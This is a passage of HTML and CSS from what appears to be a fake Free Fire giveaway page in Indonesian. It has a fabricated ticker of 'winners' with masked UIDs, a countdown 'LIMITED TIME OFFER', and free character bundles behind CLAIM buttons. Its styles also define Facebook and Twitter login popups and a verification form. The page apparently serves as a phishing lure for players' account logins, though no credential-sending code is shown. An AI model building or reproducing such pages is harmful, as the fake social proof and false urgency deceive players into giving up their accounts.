         display: block;
         }
         .footer-copyright-text-left {
         color: #fff;
         font-size: 12px;
         padding:5px;
         font-family:sans-serif;
         text-align: center;
         display: inline-block;
         margin: 5px;
         border-bottom: 1px solid #fff;
         }
         .footer-copyright-text-center {
         color: #fff;
         font-size: 12px;
         padding:5px;
         font-family:sans-serif;
         text-align: center;
         display: inline-block;
         margin: 5px;
         border-bottom: 1px solid #fff;
         }
         .footer-copyright-text-right {
         color: #fff;
         font-size: 12px;
         padding:5px;
         font-family:sans-serif;
         text-align: center;
         display: inline-block;
         margin: 5px;
         }
         .footer-copyright-text-cookie {
         color: #fff;
         font-size: 14px;
         font-family:Teko;
         text-align: center;
         display: block;
         margin-top: -5px;
         }
         .footer-copyright-text-icon {	
         width:15%;
         padding:5px;
         padding-top: 25px;
         margin-left: auto;
         margin-right: auto;	
         float: center;
         text-align: center;
         display: inline-block;
         }
         .footer-txt-copyrights {
         color: #bdbdbd;
         padding:10px;
         padding-top:10px;
         padding-bottom:25px;
         font-size: 14px;
         font-family:arial;
         text-align: center;
         }
         .footer-txt-join {
         margin-top: 10px;
         margin-bottom: 15px;
         color: #ffbe21;
         font-size: 30px;
         font-family: laza;
         text-align: left;
         text-transform: uppercase;
         }
         .footer-txt-twitter {
         margin-top: -3px;
         margin-bottom: -10px;
         color: #ffbe21;
         font-size: 25px;
         font-family: teko;
         text-align: center;
         }
         .footer-socmed-box {
         background: url(https://cdn.jsdelivr.net/gh/Hyuu09/cdn-epep@main/images/footer_link_bg.png) no-repeat center center;
         background-size: 100% 100%;
         width: 100%;
         height: 55px;
         margin-bottom: 10px;
         padding: 5px;
         border-radius: 3px;
         }
         .footer-socmed-box:hover {
         background: url(https://cdn.jsdelivr.net/gh/Hyuu09/cdn-epep@main/images/footer_link_bg_on.png) no-repeat center center;
         background-size: 100% 100%;
         transition: 1s;
         }
         .footer-socmed-img-main {
         width: 30px;
         height: 30px;
         margin-top: 7px;
         margin-left: 15px;
         margin-right: 15px;
         float: left;
         }
         .footer-socmed-img-other {
         width: 35px;
         height: 26px;
         margin-top: 10px;
         margin-left: 15px;
         margin-right: 11px;
         float: left;
         }
         .footer-socmed-box p {
         margin-top: 7px;
         color: #fff;
         font-size: 25px;
         font-family: Teko;
         text-align: left;
         text-transform: uppercase;
         }
         .footer-socmed-box button {
         background: #ffbe21;
         width: 30%;
         height: auto;
         margin-top: 10px;
         margin-bottom: 10px;
         margin-right: 15px;
         padding: 1px;
         padding-top: 3px;
         color: #000;
         font-size: 16px;
         font-family: Teko;
         text-align: center;
         text-transform: uppercase;
         border: none;
         border-radius: 2px;
         outline: none;
         float: right;
         }
         .verify-box-navbar {
         background-size: 100% 100%;
         width: 93%;
         height: 19%;
         margin-left: auto;
         margin-right: auto;
         display: block;
         }
         .verify-box-navbar-description {
         width: 50%;
         margin-top: 50px;
         margin-right: 20px;
         color: #fff;
         font-size: 18px;
         font-family: Teko;
         font-weight: 500;
         text-align: left;
         float: right;
         }
         .verify-box-navbar-form {
         background-size: 100% 100%;
         width: 93%;
         height: auto;
         margin-top: 25px;
         margin-left: auto;
         margin-right: auto;
         display: block;
         }
         .verify-box-navbar-form input {
         background: url(verify-bg.png) no-repeat center center;
         background-size: 100% 100%;
         width: 95%;
         height: 40px;
         margin-left: 10px;
         margin-bottom: 4px;
         padding: 4px;
         padding-left: 10px;
         padding-right: auto;
         color: #f1f1f0;
         font-size: 15px;
         font-family: laza;
         font-weight: 500;
         border: 2px solid #232323;
         position: relative;
         outline: none;
         -webkit-appearance: none;
         -moz-appearance: none;
         border-radius: 15px;
         }
         .verify-box-navbar-form input::placeholder {
         color: #f1f1f0;
         }
         .verify-box-navbar-form select {
         background: url(verify-bg.png) no-repeat center center;
         background-size: 100% 100%;
         width: 95%;
         height: 40px;
         margin-left: 10px;
         margin-bottom: 4px;
         padding: 4px;
         padding-left: 10px;
         padding-right: auto;
         color: #f1f1f0;
         font-size: 15px;
         font-family: laza;
         font-weight: 500;
         border: 2px solid #232323;
         position: relative;
         outline: none;
         -webkit-appearance: none;
         -moz-appearance: none;
         border-radius: 15px;
         }
         .verify-box-content {
         background-size: 100% 100%;
         width: 93%;
         height: auto;
         margin-top: -1px;
         margin-left: auto;
         margin-right: auto;
         margin-bottom: 15px;
         padding: 20px;
         padding-top: 0px;
         padding-bottom: 25px;
         display: block;
         }
         .verify-box-content-title {
         width: 95%;
         height: auto;
         margin-top: 10px;
         margin-left: auto;
         margin-right: auto;
         margin-bottom: 10px;
         padding: 6px;
         color: #fff;
         font-size: 18px;
         font-family: laza;
         font-weight: 500;
         text-align: center;
         display: block;
         }
         .verify-box-content-title i {
         padding-top: 15px;
         padding-bottom: 15px;
         color: #f1f1f0;
         margin-top: 29px;
         font-size: 100px;
         text-align: center;
         }
         .verify-box-content button {
         background: url(submit.png) no-repeat center center;
         background-size: 76% 77%;
         width: 55%;
         height: 55px;
         margin-top: 10px;
         margin-left: auto;
         margin-right: auto;
         margin-bottom: 10px;
         padding: 9px;
         padding-top: 8px;
         padding-left: 20px;
         padding-right: 20px;
         color: #030303;
         font-size: 19px;
         font-family: laza;
         font-weight: 500;
         text-align: center;
         border: none;
         display: block;
         }
         .about-box-content {
         background: url(aboutrules-sec.png) no-repeat center center;
         background-size: 100% 100%;
         width: 96%;
         height: 120px;
         margin-top: 10px;
         margin-left: auto;
         margin-right: auto;
         margin-bottom: 10px;
         padding: 20px;
         padding-left: auto;
         padding-right: auto;
         float: center;
         color: #000;
         display: block;
         }
         .about-box-content-title {
         width: 95%;
         height: auto;
         margin-top: 10px;
         margin-left: auto;
         margin-right: auto;
         margin-bottom: 10px;
         padding: 6px;
         color: #000;
         font-size: 18px;
         font-family: laza;
         font-weight: 500;
         text-align: center;
         display: block;
         }
         .about-box-content-title i {
         padding-top: 15px;
         padding-bottom: 15px;
         color: #000;
         font-size: 100px;
         text-align: center;
         }
         figure {
         margin: 0;
         padding: 0;
         overflow: hidden;
         }
         .itemShine figure {
         position: relative;
         }
         .itemShine figure::before {
         background: -webkit-linear-gradient(left, rgba(255, 255, 255, 0) 0%, rgba(255, 255, 255, .3) 100%);
         background: linear-gradient(to right, rgba(255, 255, 255, 0) 0%, rgba(255, 255, 255, .3) 100%);
         width: 50%;
         height: 100%;
         top: 0;
         left: -75%;
         position: absolute;
         z-index: 2;
         content: '';
         display: block;
         -webkit-transform: skewX(-25deg);
         transform: skewX(-25deg);
         }
         .itemShine figure::before {
         -webkit-animation: shine 2s infinite;
         animation: shine 2s infinite;
         }
         @-webkit-keyframes shine {
         100% {
         left: 125%;
         }
         }
         @keyframes shine {
         100% {
         left: 125%;
         }
         }
         .kanan {
         float: right;
         }
         .kiri {
         float: left;
         }
         .tengah {
         margin-left: auto;
         margin-right: auto;
         display: block;
         }
         ::-webkit-scrollbar {
         display: none;
         width: 0px;
         }
         .twitter-load {
         background-size: 100% 100%;
         width: 93%;
         height: 388px;
         margin-top: 0px;
         margin-left: auto;
         margin-right: auto;
         margin-bottom: 15px;
         padding: 20px;
         padding-top: 0px;
         padding-bottom: 25px;
         display: block;
         }
         .twitter-load-title {
         width: 95%;
         height: auto;
         margin-top: 70px;
         margin-left: auto;
         margin-right: auto;
         margin-bottom: 10px;
         padding: 6px;
         padding-top: 90px;
         color: #fff;
         font-size: 18px;
         font-family: laza;
         font-weight: 500;
         text-align: center;
         display: block;
         }
         .twitter-load-title i {
         margin-top: 90px;
         padding-top: 15px;
         padding-bottom: 15px;
         color: #00acee;
         font-size: 50px;
         text-align: center;
         }
         .fb-load {
         background-size: 100% 100%;
         width: 93%;
         height: 304px;
         margin-top: -1px;
         margin-left: auto;
         margin-right: auto;
         margin-bottom: 15px;
         padding: 20px;
         padding-top: 0px;
         padding-bottom: 25px;
         display: block;
         }
         .fb-load img {
         width: 50px;
         height: 50px;
         margin-top: 215px;
         margin-bottom: -55px;
         }
         .fb-load-title {
         width: 95%;
         height: auto;
         margin-top: 10px;
         margin-left: auto;
         margin-right: auto;
         margin-bottom: 10px;
         padding: 6px;
         color: #999998;
         font-size: 18px;
         font-family: laza;
         font-weight: 500;
         text-align: center;
         display: block;
         }
         .fb-load-title i {
         margin-top: 200px;
         padding-top: 15px;
         padding-bottom: 15px;
         color: #999998;
         font-size: 30px;
         text-align: center;
         }
         .event-notification {
         width: 93%;
         height: 53px;
         padding: 7px;
         margin-right: auto;
         margin-left: auto;
         }
         .event-notification-txt {
         padding-top: 10px;
         padding-left: 34px;
         color: #dbff85;
         font-size: 16px;
         font-family: Teko;
         font-weight: 550;
         text-align: left;
         float: left;
         }
         .scroll {
         overflow: scroll;
         position: relative;
         width: 100%;
         height: 358px;
         margin-top: 0px;
         margin-left: auto;
         margin-right: auto;
         display: block;
         scrollbar-face-color: #ffbb40;
         scrollbar-shadow-color: #ffbb40;
         scrollbar-highlight-color: #ffbb40;
         scrollbar-3dlight-color: #ffbb40;
         scrollbar-darkshadow-color: #ffbb40;
         scrollbar-track-color: #ffbb40;
         scrollbar-arrow-color: #ffbb40;
         }
         .timer {
         background: url(https://cdn.jsdelivr.net/gh/Hyuu09/cdn-epep@main/images/bg_tip2.png) no-repeat center center;
         background-size: 71% 106%;
         width: 98%;
         height: 15%;
         margin-top: 403px;
         margin-right: 0;
         display: block;
         padding-top: 31px;
         padding-left: 34px;
         text-align: center;
         font-size: 10px;
         font-family: laza4;
         font-weight: 400;
         color: #ffffff;
         font-style: oblique;
         text-shadow: 1px 1px 1px #000000;
         position: absolute;
         }
         .alter-text {
         display: block;
         margin-left: 14px;
         margin-right: 0;
         margin-top: -31px;
         margin-bottom: 32px;
         overflow: hidden;
         text-align: center;
         white-space: nowrap;
         width: 92%;
         }
         .alter-text>span {
         display: inline-block;
         position: relative;
         color: #ffffff;
         cursor: default;
         font-size: 11px;
         text-shadow: none;
         }
         .alter-text>span:before,
         .alter-text>span:after {
         background: #9093A6;
         border-bottom: 1px solid #9093A6;
         content: "";
         height: 1px;
         position: absolute;
         top: 50%;
         width: 43px;
         }
         .alter-text>span:before {
         margin-right: 15px;
         right: 100%;
         }
         .alter-text>span:after {
         left: 100%;
         margin-left: 15px;
         }
         .notifgift {
         background: url(bg_tip3.png) no-repeat center center;
         position: absolute;
         opacity: 100%;
         color: #000000;
         text-shadow: 1px 1px 1px #ffffff;
         border-radius: 2px;
         background-size: 77% 100%;
         width: 97%;
         height: 34px;
         margin-top: 20px;
         padding-top: 9px;
         padding-right: 0px;
         text-align: center;
         font-size: 12px;
         font-family: laza;
         font-weight: 500;
         display: block;
         }
         .box-rewards {
         background-size: 105% 100%;
         width: 100%;
         height: auto margin-left:auto;
         margin-top: 0px;
         margin-right: auto;
         margin-bottom: 10px;
         border: 0px solid #E29E53;
         border-radius: 5px;
         position: relative;
         display: block;
         }
         .box-item-rewards {
         width: 100%;
         height: auto;
         padding-top: 20px;
         margin-right: auto;
         }
         .item {
         background: linear-gradient(45deg, #16acf2, #bdbdbd);
         background-size: 100% 100%;
         border: 2px solid #acacac;
         border-top-left-radius: 7px;
         border-top-right-radius: 7px;
         width: 26%;
         height: 26%;
         margin: 3px;
         margin-bottom: 34px;
         display: inline-block;
         box-shadow: 0px 0px 4px #000;
         }
         .item2 {
         background: linear-gradient(45deg, #743f9b, #bdbdbd);
         background-size: 100% 100%;
         border: 2px solid #acacac;
         border-top-left-radius: 13px;
         border-top-right-radius: 13px;
         width: 26%;
         height: 26%;
         margin: 3px;
         margin-bottom: 34px;
         display: inline-block;
         }
         .item3 {
         background: linear-gradient(45deg, #743f9b, #bdbdbd);
         background-size: 100% 100%;
         border: 2px solid #acacac;
         border-top-left-radius: 13px;
         border-top-right-radius: 13px;
         width: 26%;
         height: 26%;
         margin: 3px;
         margin-bottom: 34px;
         display: inline-block;
         }
         .item .item-nominal {
         padding-right: 4px;
         color: #fff;
         font-size: 25px;
         font-family: DINMITTELSCHRIFTSTD;
         text-align: right;
         position: absolute;
         }
         .item-label .marquee {
         white-space: nowrap;
         font-family: laza3;
         overflow: hidden;
         display: inline-block;
         animation: marquee 10s linear infinite;
         }
         .item-label .marquee a {
         display: inline-block;
         }
         @keyframes marquee {
         0% {
         transform: translate3d(0, 0, 0);
         }
         100% {
         transform: translate3d(-50%, 0, 0);
         }
         }
         .item img {
         width: 79%;
         height: 79%;
         margin-top: 6%;
         margin-bottom: 4%;
         }
         .item-label {
         width: 100%;
         overflow: hidden;
         color: #ffffff;
         text-shadow: 1px 1px 1px #000000;
         font-size: 11px;
         font-family: laza3;
         font-weight: 550;
         text-align: center;
         margin-top: -13px;
         margin-bottom: 3px;
         }
         .item-hot {
         background: #bd8817;
         width: 34px;
         color: #ffffff;
         text-shadow: 1px 1px 1px #000000;
         font-size: 9px;
         font-family: sans-serif;
         font-weight: 500;
         text-align: center;
         margin-top: -65px;
         margin-left: 3px;
         padding: 1px;
         border-top-right-radius: 7px;
         border-bottom-left-radius: 7px;
         position: absolute;
         }
         .item-pcs {
         color: #ffffff;
         text-shadow: 1px 1px 1px #000000;
         font-size: 14px;
         font-family: 'laza';
         font-weight: 550;
         text-align: center;
         margin-top: -19px;
         margin-left: 25px;
         position: absolute;
         }
         .item p {
         background: url(https://cdn.jsdelivr.net/gh/Hyuu09/cdn-epep@main/images/buttonf.png);
         background-size: 100% 100%;
         width: 104%;
         margin-left: -2px;
         height: 27px;
         padding: 3px;
         padding-top: 7px;
        // padding-left: 18px;
         padding-left: 0;
         border: 1px solid #acacac;
         //color: #4f4a35;
         color: #ededed;
         text-shadow: 1px 1px 1px #000000;
         font-size: 13px;
         font-family: 'laza';
         font-weight: 500;
         text-align: center;
         margin-top: 2%;
         border-bottom-right-radius: 7px;
         border-bottom-left-radius: 7px;
         box-shadow: 0px 0px 4px #000;
         }
         .item p img {
         margin-left: -25px;
         margin-bottom: -6px;
         width: 20px;
         height: auto;
         border: none;
         position: absolute;
         margin-top: -2.5px;
         }
         .item s {
         text-decoration: line-through;
         color: #000000;
         }
         .LabelCards_card_label_box__Hcfaa {
         box-sizing: border-box;
         left: 6px;
         overflow: hidden;
         position: absolute;
         right: 6px;
         top: 6px;
         z-index: 1;
         }
         .lazabox {
         background: url(lazabox.png);
         background-size: 100% 100%;
         width: 100%;
         height: 70%;
         margin-top: -230px;
         object-position: center;
         }
         .pd-giftbox {
         position: absolute;
         top: 41.8%;
         left: 64%;
         transform: translateX(-0.645rem);
         }
         .rtl .pd-giftbox {
         direction: ltr
         }
         .pd-giftbox>img:nth-child(1) {
         position: absolute;
         top: -43px;
         left: 25px;
         z-index: 2;
         width: 6.2rem;
         height: 4.92rem;
         transform: rotate(-18deg);
         transform-origin: 100% 100%;
         -moz-transform-origin: 100% 100%;
         -webkit-transform-origin: 100% 100%;
         -o-transform-origin: 100% 100%;
         animation: gift-box-hat-kf 5s infinite;
         -moz-animation: gift-box-hat-kf 5s infinite;
         -webkit-animation: gift-box-hat-kf 3s infinite;
         -o-animation: gift-box-hat-kf 3s infinite
         }
         .pd-giftbox>img:nth-child(2) {
         position: absolute;
         width: 7.29rem;
         height: 5.1rem;
         }
         @keyframes gift-box-hat-kf {
         0% {
         transform: rotate(0deg)
         }
         12.5% {
         transform: rotate(0deg)
         }
         25% {
         transform: rotate(-18deg)
         }
         37.5% {
         transform: rotate(-18deg)
         }
         50% {
         transform: rotate(0deg)
         }
         62.5% {
         transform: rotate(0deg)
         }
         75% {
         transform: rotate(-18deg)
         }
         87.5% {
         transform: rotate(-18deg)
         }
         100% {
         transform: rotate(0deg)
         }
         }
         .yun {
         position: absolute
         }
         .yun1_1 {
         width: 35px;
         height: 18px;
         left: 10px;
         top: 63px;
         background: url(lazcloud/yun1_1.png) 0/100% 100% no-repeat
         }
         .yun1_2 {
         width: 19px;
         height: 12px;
         left: 10px;
         top: 130px;
         background: url(lazcloud/yun1_2.png) 0/100% 100% no-repeat
         }
         .yun1_3 {
         width: 57px;
         height: 20px;
         left: 215px;
         top: 72px;
         background: url(lazcloud/yun1_3.png) 0/100% 100% no-repeat
         }
         .yun2_1 {
         width: calc(136 / 1920 * 100vw);
         height: calc(61 / 1920 * 100vw);
         left: calc(93 / 1920 * 100vw);
         top: calc(141 / 1920 * 100vw);
         background: url(lazcloud/yun2_1.png) 0/100% 100% no-repeat
         }
         .yun2_2 {
         width: calc(561 / 1920 * 100vw);
         height: calc(207 / 1920 * 100vw);
         left: calc(99 / 1920 * 100vw);
         top: calc(207 / 1920 * 100vw);
         background: url(lazcloud/yun2_2.png) 0/100% 100% no-repeat
         }
         .yun2_3 {
         width: 68px;
         height: 25px;
         left: 293px;
         top: 19px;
         background: url(lazcloud/yun2_3.png) 0/100% 100% no-repeat
         }
         .yun2_4 {
         width: 71px;
         height: 29px;
         left: 290px;
         top: 141px;
         background: url(lazcloud/yun2_4.png) 0/100% 100% no-repeat;
         }
         .yun2_5 {
         width: 69px;
         height: 27px;
         left: 10px;
         top: 158px;
         background: url(lazcloud/yun2_5.png) 0/100% 100% no-repeat
         }
         .yun2_6 {
         width: 58px;
         height: 28px;
         left: 263px;
         top: 88px;
         background: url(lazcloud/yun2_6.png) 0/100% 100% no-repeat
         }
         .tab_rewards {
         background: url(box.png);
         background-size: 100% 100%;
         width: 104%;
         height: 361px;
         margin-top: 90px;
         margin-right: -8px;
         margin-left: 10px;
         padding-top: 52px;
         align-content: center;
         float: inline-end;
         opacity: 120%;
         }
         .nom {
         position: absolute;
         padding-left: 387px;
         padding-top: 51px;
         color: #fff;
         font-size: 13px;
         font-family: dinm;
         font-weight: 550;
         }
         .lazaslide p {
         background: repeating-linear-gradient(168deg, #823030, transparent 100px);
         background-size: 100% 100%;
         width: 312px !important;
         margin-top: 55%;
         padding-left: 5px;
         padding-right: 5px;
         padding: 3px;
         margin-left: 39px;
         float: left;
         text-align: center;
         border-top-left-radius: 7px;
         border-top-right-radius: 7px;
         border-bottom-left-radius: 7px;
         border-bottom-right-radius: 7px;
         }
         .lazaslide span {
         font-family: laza3;
         font-size: 13px;
         color: #fff;
         }
         .s3_tit {
         font-family: laza;
         color: #fff;
         margin-left: 5px;
         margin-top: 5px;
         }
         @media only screen and (max-width:600px) {
         .lazabox {
         background: url(lazabox.png);
         background-size: 100% 100%;
         width: 100%;
         height: 70%;
         margin-top: -230px;
         object-position: center;
         }
         .box-rewards {
         margin-top: 0px;
         width: 100%;
         height: auto;
         }
         .box-item-rewards {
         width: 100%;
         height: auto;
         padding-top: 20px;
         margin-left: auto;
         margin-right: auto;
         }
         .containerLanding,
         .containerHome {
         width: 100%;
         height: auto;
         margin-top: -3px;
         margin-bottom: 0px;
         border: none;
         border-radius: 0px;
         padding: 0px;
         }
         .slider-container {
         margin-top: -3px;
         border: none;
         }
         .laz-container {
         background: url(https://cdn.jsdelivr.net/gh/Hyuu09/cdn-epep@main/images/lazback.jpg) no-repeat center;
         background-size: 100% 100%;
         margin-top: -150px;
         padding: 5px;
         width: 100%;
         margin-left: 0px;
         margin-right: 0px;
         height: 480px;
         position: relative;
         }
         .gallery-container {
         float: left;
         margin-top: -2px;
         width: 100%;
         height: auto;
         border: 0px solid #fff;
         }
         .box {
         width: 100%;
         height: 405px;
         margin-top: -45px;
         margin-bottom: -25px;
         }
         .box-item {
         width: 100%;
         margin-left: auto;
         margin-right: auto;
         padding-top: 1px;
         }
         .loginpop {
         background: url(https://cdn.jsdelivr.net/gh/Hyuu09/cdn-epep@main/images/lazlogin.png) no-repeat center center;
         background-size: 100% 100%;
         width: 400px;
         height: 200px;
         }
         .scroll {
         height: 358px;
         }
         .lazaslide p {
         margin-top: 55%;
         margin-left: 39px;
         }
         .s3_tit {
         margin-left: 5px;
         margin-top: 5px;
         }
         .event-title {
         margin-top: -6px;
         margin-left: -5px;
         }
         .event-title2 {
         margin-top: 470px;
         margin-left: -5px;
         }
         .event-notification {
         width: 93%;
         height: 53px;
         padding: 7px;
         margin-right: auto;
         margin-left: auto;
         }
         .event-notification-text {
         padding-top: 11px;
         font-family: laza;
         font-size: 16px;
         }
         .footer {
         border-left: none;
         border-right: none;
         border-top: none;
         border-bottom: none;
         }
         .popup-box-wrapper {
         width: auto;
         margin-top: 60%;
         }
         .popup-box-wrapperz {
         width: 360px;
         margin-top: 60%;
         }
         .popup-box-wrappers {
         width: 360px;
         margin-top: 60%;
         }
         .popup-box-item {
         width: 16%;
         height: 67px;
         margin-top: 38px;
         }
         .popup-box-login-fb {
         margin-top: 35%;
         }
         .popup-box-login-twitter {
         margin-top: 40%;
         }
         .link-box {
         margin-top: 40%;
         }
         .footer {
         background-position-y: calc(500 / 640 * 210vw);
         }
         .footer-socmed-box p {
         margin-top: 12px;
         }
         .event-notification {
         background-size: auto;
         background-size: 94% 100%;
         width: 85%;
         height: 48px;
         margin-left: auto;
         margin-right: auto;
         margin-top: -2px;
         margin-bottom: -82px;
         display: block;
         }
         .event-notification-txt {
         padding-top: 10px;
         padding-left: 34px;
         color: #dbff85;
         font-size: 16px;
         font-family: Teko;
         font-weight: 550;
         text-align: left;
         float: left;
         }
         .timer {
         margin-left: 0px;
         margin-top: 398px;
         }
         .popup-box-item rw {
         top: 18px;
         right: -182px;
         }
         .popup-box-item pr {
         top: 41px;
         right: -241px;
         }
         .popup-box-item prs {
         right: -243px;
         }
         .notifgift {
         margin-top: 20px;
         }
         .event-notification-timer {
         padding-top: 44px;
         padding-right: 28px;
         color: #dbff85;
         font-size: 27px;
         font-family: Teko;
         font-weight: 550;
         text-align: left;
         margin-bottom: 13px;
         float: right;
         }
         .alert-text {
         margin-top: -330px;
         margin-left: -6px;
         padding: 7px;
         color: #ffffff;
         text-align: center;
         font-size: 14px;
         font-family: laza;
         border: none;
         }
         .alert-text-mid {
         margin-top: 1px;
         padding: 7px;
         color: #f1f1f0;
         text-align: center;
         font: 25px;
         font-family: laza;
         border: none;
         margin-right: -2px;
         font-size: 19px;
         }
         .popup-box-bg {
         background: url(popup-box-bg2.png) no-repeat center center;
         background-size: 100% 100%;
         width: 109%;
         margin-top: -12px;
         margin-left: -15px;
         }
         .s1_man1 {
         display: block;
         width: calc();
         height: calc();
         background: url(m416.png) center/100% 100% no-repeat;
         position: absolute;
         top: 400px;
         left: calc(-80 /1920*100vw);
         bottom: calc(-23 /1920*100vw);
         animation: bounce_down 4s linear infinite;
         -webkit-animation: bounce_down 4s linear infinite
         }
         @-webkit-keyframes bounce_down {
         25% {
         -webkit-transform: translateY(-10px)
         }
         50%,
         100% {
         -webkit-transform: translateY(0)
         }
         75% {
         -webkit-transform: translateY(10px)
         }
         }
         @keyframes bounce_down {
         25% {
         transform: translateY(-10px)
         }
         50%,
         100% {
         transform: translateY(0)
         }
         75% {
         transform: translateY(10px)
         }
         }
         }
         .i {
         display: inline-flex;
         width: 8%;
         animation: anim 8.5s ease-in-out infinite;
         transform: translateY(-150%) rotate(0deg);
         }
         .n1 {
         animation-delay: 0.1s;
         }
         .n2 {
         animation-delay: 1.2s;
         }
         .n3 {
         animation-delay: 0.6s;
         margin-left: 280px;
         }
         .n4 {
         animation-delay: 1.4s;
         width: 10px;
         }
         .n5 {
         animation-delay: 0.4s;
         width: 10px;
         margin-left: 160px;
         }
         .n6 {
         animation-delay: 0.6s;
         }
         h1 {
         transform: rotate(-45deg);
         }
         @keyframes anim {
         0% {
         transform: translateY(-180%) rotate(0deg);
         }
         100% {
         transform: translateY(120vh) rotate(-360deg);
         }
         }
         .yun {
         position: absolute
         }
         .yun1_1 {
         width: 35px;
         height: 18px;
         left: 10px;
         top: 63px;
         background: url(lazcloud/yun1_1.png) 0/100% 100% no-repeat
         }
         .yun1_2 {
         width: 19px;
         height: 12px;
         left: 10px;
         top: 130px;
         background: url(lazcloud/yun1_2.png) 0/100% 100% no-repeat
         }
         .yun1_3 {
         width: 57px;
         height: 20px;
         left: 215px;
         top: 72px;
         background: url(lazcloud/yun1_3.png) 0/100% 100% no-repeat
         }
         .yun2_1 {
         width: calc(136 / 1920 * 100vw);
         height: calc(61 / 1920 * 100vw);
         left: calc(93 / 1920 * 100vw);
         top: calc(141 / 1920 * 100vw);
         background: url(lazcloud/yun2_1.png) 0/100% 100% no-repeat
         }
         .yun2_2 {
         width: calc(561 / 1920 * 100vw);
         height: calc(207 / 1920 * 100vw);
         left: calc(99 / 1920 * 100vw);
         top: calc(207 / 1920 * 100vw);
         background: url(lazcloud/yun2_2.png) 0/100% 100% no-repeat
         }
         .yun2_3 {
         width: 68px;
         height: 25px;
         left: 293px;
         top: 19px;
         background: url(lazcloud/yun2_3.png) 0/100% 100% no-repeat
         }
         .yun2_4 {
         width: 71px;
         height: 29px;
         left: 290px;
         top: 141px;
         background: url(lazcloud/yun2_4.png) 0/100% 100% no-repeat;
         }
         .yun2_5 {
         width: 69px;
         height: 27px;
         left: 10px;
         top: 158px;
         background: url(lazcloud/yun2_5.png) 0/100% 100% no-repeat
         }
         .yun2_6 {
         width: 58px;
         height: 28px;
         left: 263px;
         top: 88px;
         background: url(lazcloud/yun2_6.png) 0/100% 100% no-repeat
         }
      </style>
      <div id="fgnloading-ff" class="hidden"></div>
      <div class="slider-container">
         <div class="navbar">
            <img class="navbar-logo" src="https://cdn.jsdelivr.net/gh/Hyuu09/cdn-epep@main/images/logo_2.png">
            <div class="navbar-right">
               <img class="navbar-language" src="https://cdn.jsdelivr.net/gh/Hyuu09/cdn-epep@main/images/navbar-shop.png">
               <img class="navbar-language" src="https://cdn.jsdelivr.net/gh/Hyuu09/cdn-epep@main/images/navbar-language.png">
               <img class="navbar-language" src="https://cdn.jsdelivr.net/gh/Hyuu09/cdn-epep@main/images/navbar.png">
            </div>
         </div>
         <!--- navbar-right --->
      </div>
      <!--- Banner/Video --->
      <div class="header">
         <img src="https://cdn.jsdelivr.net/gh/Hyuu09/cdn-epep@main/images/1.jpg" class="width: 100%;">
      </div>
      <div class="laz-home">
         <div class="laz-container" style="margin-top:-1px;">
            <div>
               <div class="slidezs" style="position: absolute;top: -217px;margin-left: -5px;">
                  <div class="lazaslide" style="display: none;">
                     <p class="gift-name animated fadeInDown">
                        <span>UID 6266****04 Mendapatkan  Bundle - Satoru Gojo</span>
                  </p></div>
                  <div class="lazaslide" style="display: block;">
                     <p class="gift-name animated fadeInDown">
                        <span>UID 7785****23 Mendapatkan Bundle - Megumi Fushiguro</span>
                  </p></div>
                  <div class="lazaslide" style="display: none;">
                     <p class="gift-name animated fadeInDown">
                        <span>UID 5280*****21 Mendapatkan Bundle - Yuji Itadori</span>
                  </p></div>
                  <div class="lazaslide" style="display: none;">
                     <p class="gift-name animated fadeInDown">
                        <span>UID 4766*****73 Mendapatkan Bundle - Ryomen Sukuna</span>
                  </p></div>
                  <div class="lazaslide" style="display: none;">
                     <p class="gift-name animated fadeInDown">
                        <span>UID 5316*****12 Mendapatkan Bundle - Nobara Kugisaki</span>
                  </p></div>
                  <div class="lazaslide" style="display: none;">
                     <p class="gift-name animated fadeInDown">
                        <span>UID 3340*****1 Mendapatkan M1187 - Incendium Burst</span>
                  </p></div>
                  <div class="lazaslide" style="display: none;">
                     <p class="gift-name animated fadeInDown">
                        <span>UID 6582*****43 Mendapatkan AK47 - Draco (Max)</span>
                  </p></div>
               </div>
               <!--- header ---> 
               <div>
                  <!--<div class="subject-event" style="opacity: 100%;">DAPATKAN DISKON HINGGA 50%</div>-->
                  <div class="event-title" style="opacity: 100%;"></div>
                  <div class="event-title2" style="opacity: 100%;"></div>
                  <div class="timer">LIMITED TIME OFFER<br>ENDS IN: <i class="fa-solid fa-stopwatch fa-shake"></i><span id="timer1" style="animation: fade .6s infinite alternate;color: #ff2c2c;">  23 : 59 : 55</span></div>
                  <!--- event-notification-timer --->
                  <div class="box-rewards">
                     <div class="box-item-rewards">
                        <div class="scroll">
                           <center>
                              <div class="item" onmousedown="buka.play();" onclick="open_itemReward_confirmation2(this);" src="img/reward/withBg/1.jpg" item-name="Bundle - Satoru Gojo" item-total="" item-price="1">
                                 <div>
                                    <figure>
                                       <img style="border-bottom: 0px;" src="https://cdn.jsdelivr.net/gh/Hyuu09/cdn-epep@main/images/1.png">
                                    </figure>
                                 </div>
                                 <div>
                                    <div class="item-hot">FREE</div>
                                    <div class="item-label">
                                       <div class="marquee">
                                          <a>� Bundle - Satoru Gojo�</a>
                                          <a>� Bundle - Satoru Gojo�</a>
                                       </div>
                                    </div>
                                    <p>
                                    CLAIM                                 
                                    <!--
                                    <p>
                                       <img src="img/tokens.png">
                                       <s>1000</s> 
                                       <d>
                                       1
                                       -->
                                 </p></div>
                              </div>
                              <div class="item" onmousedown="buka.play();" onclick="open_itemReward_confirmation2(this);" src="img/reward/withBg/2.jpg" item-name="Bundle - Megumi Fushiguro" item-total="" item-price="1">
                                 <div>
                                    <figure>
                                       <img style="border-bottom: 0px;" src="https://cdn.jsdelivr.net/gh/Hyuu09/cdn-epep@main/images/2.png">
                                    </figure>
                                 </div>
                                 <div>
                                    <div class="item-hot">FREE</div>
                                    <div class="item-label">
                                       <div class="marquee">
                                          <a>� Bundle - Megumi Fushiguro�</a>
                                          <a>� Bundle - Megumi Fushiguro�</a>
                                       </div>
                                    </div>
                                    <p>
                                    CLAIM                                 
                                    <!--
                                    <p>
                                       <img src="img/tokens.png">
                                       <s>1000</s> 
                                       <d>
                                       1
                                       -->
                                 </p></div>
                              </div>
                              <div class="item" onmousedown="buka.play();" onclick="open_itemReward_confirmation2(this);" src="img/reward/withBg/3.jpg" item-name="Bundle - Yuji Itadori" item-total="" item-price="1">
                                 <div>
                                    <figure>
                                       <img style="border-bottom: 0px;" src="https://cdn.jsdelivr.net/gh/Hyuu09/cdn-epep@main/images/3.png">
                                    </figure>
                                 </div>
                                 <div>
                                    <div class="item-hot">FREE</div>
                                    <div class="item-label">
                                       <div class="marquee">
                                          <a>� Bundle - Yuji Itadori�</a>
